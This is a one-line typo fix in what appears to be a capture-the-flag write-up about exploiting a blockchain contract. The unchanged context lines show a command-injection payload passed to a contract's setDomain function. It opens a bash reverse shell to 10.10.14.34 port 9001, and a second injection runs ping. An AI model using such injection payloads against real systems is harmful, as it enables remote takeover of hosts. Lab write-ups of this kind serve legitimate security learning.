@@ -597,7 +597,7 @@ contract = w3.eth.contract(abi=abi, address=cAddress) # enables 'functions' i.e.
 contract.functions.setDomain("10.10.14.34; bash -c 'bash -i >& /dev/tcp/10.10.14.34/9001 0>&1'").transact() # calls shell to listener
 ```
 
-I believe it is worth noting that I personally ran the the command:
+I believe it is worth noting that I personally ran the command:
 
 ```
 contract.functions.setDomain("10.10.14.34; ping -c 5 10.10.14.34").transact()
